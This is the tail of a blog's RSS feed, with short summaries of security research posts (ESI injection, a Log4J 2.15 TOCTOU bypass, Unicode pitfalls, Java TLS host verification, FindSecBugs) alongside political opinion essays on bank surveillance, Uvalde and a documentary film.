      <description>&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjg9YTRZYJsxOkN9MuSd8YwYjeMF5PP2nWM55_oRKYFOcqmUqM0UYmKDH3ikglqhPya8EDEd7e6LtwSARKjnx5UCjr-NL1XqvdEatYso82fwe_62GsEzLjWLzEOmBfoO7cC8VnqUGqHvUl3/s320/injection%255B1%255D.jpg&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;Last year, we published a blog post about the injection of ESI tags in pages to fool the web cache proxy, and in August 2018, our colleague Louis Dion-Marcil spoke at Defcon about the discovery of the ESI Injection uncovered by the GoSecure intrusion testing team. For those interested, the presentation has been released on the Defcon YouTube channel. Defcon and Black Hat gave us an opportunity to unveil how ESI implementations can lead to session leakage through the client web browser without any malicious JavaScript. ESI is a specification that defines statements in the form of XML tags that are interpreted by the caching server. Those statements describe the content assembly of web pages by composing various HTML fragments from external resources. An attacker can abuse this mechanism by injecting a malicious tag inside an intercepted web page.&lt;br&gt;&#xA;The current post&amp;rsquo;s objective is to follow up with items discovered after the first publication. Those discoveries are attack vectors that apply to specific implementations. It will also be an excellent platform to describe the proper mitigation for each of those findings.&lt;br&gt;&#xA;Three new ESI tricks will be presented:&lt;/p&gt;</description>
    </item>
    <item>
      <title>FindSecBugs officially an OWASP project</title>
      <link>https://ghariib.ir/posts/findsecbugs-officially-an-owasp-project/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/findsecbugs-officially-an-owasp-project/</guid>
      <description>&lt;p&gt;Over the years, Find Security Bugs &lt;em&gt;– or FindSecBugs in short –&lt;/em&gt; has evolved from a limited static-analysis tool to one with solid coverage of bug patterns. In this post, we will present the latest milestone from the project: arrival in the OWASP family, some figures and details regarding its new release.&lt;/p&gt;&#xA;&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguRN7IP7h0r2NCfuHqVv07ubueit4pTin2L1enbcKvxvZztvyqoM-aNNQup_GNQ8aVtH_S9QpEfwx534PAruhv3R3xnWv5g9lBah20tkzyMreFmlAVKPbv34BaoGRyf8LMQs1LjJER91hj/s16000/fsb%255B1%255D.png&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;h2 id=&#34;joining-the-owasp-foundation&#34;&gt;Joining the OWASP foundation&lt;/h2&gt;&#xA;&lt;p&gt;The main motivation for joining the OWASP foundation is to make it clear that the project is a community effort. While GoSecure is using the tool internally for code review assessments, it does not plan to commercialize this specific product. Under the OWASP umbrella, it should be clear to the future contributors that the project is not owned by a single organization or author.&lt;/p&gt;</description>
    </item>
    <item>
      <title>The Banking Surveillance Industrial Complex</title>
      <link>https://ghariib.ir/posts/the-banking-surveillance-industrial-complex/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/the-banking-surveillance-industrial-complex/</guid>
      <description>&lt;p&gt;A bombshell report was released in December of 2024 by the House Judiciary Committee, revealing that a massive and constitutionally dubious surveillance operation has been underway by the federal government against countless Americans. Titled, &lt;em&gt;“How the Federal Government Weaponized the Bank Secrecy Act to Spy on Americans,”&lt;/em&gt; its key findings demonstrate that the FBI and the Treasury Department’s Financial Crimes Enforcement Network (FinCEN) have been working together to undermine the 4th Amendment and conduct widespread &lt;em&gt;warrantless surveillance&lt;/em&gt; on the financial transactions of innocent U.S. citizens engaging in constitutionally protected behavior.&lt;/p&gt;</description>
    </item>
    <item>
      <title>TOCTOU Vulnerability in Log4J 2.15</title>
      <link>https://ghariib.ir/posts/toctou-vulnerability-in-log4j-2-15/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/toctou-vulnerability-in-log4j-2-15/</guid>
      <description>&lt;p&gt;Log4J has been in the spotlight for the past two weeks for a new attack vector which relies on Java Naming and Directory Interface (JNDI). In this blog, we will detail the new mitigation introduced in 2.15 and the bypass we found using a Time of Check, Time of Use vulnerability (TOCTOU). This vector was also discovered independently by Alvaro Muñoz and Tony Torralba. It is likely that many other individuals have reported related bypass techniques because there were multiple weaknesses in the same Java class (&lt;code&gt;JndiManager&lt;/code&gt;).&lt;/p&gt;</description>
    </item>
    <item>
      <title>Unicode for Security Professionals</title>
      <link>https://ghariib.ir/posts/unicode-for-security-professionals/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/unicode-for-security-professionals/</guid>
      <description>&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjA-bXWtq_FvVNTnTeUdUg2AcROc4d1ehWeU4upby9butCxWYPxyt4r-WNq0jeNuqnmnHWgLGbLeJJB2sTM_IrAaoEKXMyrJ45D-dEZ2uE6zlBPF8M9zQrufmcMgunUtGSpAkeq4Ivz84FI/s320/unicode_thumbnail-300x157-1%255B1%255D.png&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;Unicode is the de-facto standard for multilingual character encoding. UTF-8 is the most popular encoding used that supports its hundreds of thousands of characters. Aside from the encoding (byte representation of characters), Unicode defines multiple transformations that can be applied to characters. For instance, it describes the behavior of transformations such as Uppercase.&lt;/p&gt;&#xA;&lt;p&gt;The character known as Long S “ſ” (U+017F) will become a regular uppercase S “S” (U+0053). Unexpected behavior for developers can often lead to security issues. Today, we will dive into the case mapping and normalization transformations. You will see how they can contribute to logic flaws in code.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Weakness in Java TLS Host Verification</title>
      <link>https://ghariib.ir/posts/weakness-in-java-tls-host-verification/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/weakness-in-java-tls-host-verification/</guid>
      <description>&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNfphy82Pua1WHsihHar7aITooIPp_m5k0rm3TQcJ1yvrxbIFz2F-FicOyTfMSRck8-fLd17HcSGV-UQz3b5U0YmvTtU10hMRI1uQXi_hsPJkK3lsSIxgP1c3H3uxuKEC-53WIBmsUHdTz/w400-h169/oracle_thumbnail_feature%255B1%255D.png&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;Unicode-related vulnerabilities have seen an increase in momentum in the past year. Last year, a Black Hat presentation by Jonathan Birch detailed how character normalization NFC/NFKC can lead to glitches in URL and host manipulation. Recently, two vulnerabilities were found in password reset functionality. The two affected applications were Django and Github. In the previous blog post, we have presented API transforming code points with potential side effects. In this post, we present one of our findings: a vulnerability affecting Oracle JDK and Open JDK host verification in the TLS communication. We are also including details from a similar weakness in Apache HTTP client.&lt;/p&gt;</description>
    </item>
    <item>
      <title>When Governments Fail, Private Initiative Is the Solution</title>
      <link>https://ghariib.ir/posts/when-governments-fail-private-initiative-is-the-solution/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/when-governments-fail-private-initiative-is-the-solution/</guid>
      <description>&lt;p&gt;In a disturbing number of incidents in recent years, local governments have withheld critical services, resulting in destruction and death. Consider, for example, the mass shooting in Uvalde, Texas, on May 24, 2022.&lt;/p&gt;&#xA;&lt;p&gt;Law enforcement officers waited for 77 minutes inside Robb Elementary School before confronting and killing the active shooter who murdered 21 people—19 children and two teachers—and trapped 36 people in a room, many of whom were shot and dying. In the final incident review by the U.S. Department of Justice, Attorney General Merrick Garland called the law enforcement response “a failure,” but “criminal” is likely more accurate. Two of the responding officers will go on trial in Texas in October 2025.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Will Am I Racist? Stand the Test of Time?</title>
      <link>https://ghariib.ir/posts/will-am-i-racist-stand-the-test-of-time/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/will-am-i-racist-stand-the-test-of-time/</guid>
      <description>&lt;p&gt;&lt;em&gt;Am I Racist?&lt;/em&gt;, Matt Walsh’s searing attack on Diversity, Equity, and Inclusion (DEI) initiatives, dominated the documentary film box office in 2024. Screening in 1,600 theaters at its height, the film earned $12.3 million before streaming on the Daily Wire. Walsh’s film grossed more at the box office than any other documentary since 2019. That’s when Peter Jackson’s artistically boundary-pushing World War I film &lt;em&gt;They Shall Not Grow Old&lt;/em&gt; brought in $12.2 million. &lt;/p&gt;</description>
    </item>
  </channel>
</rss>
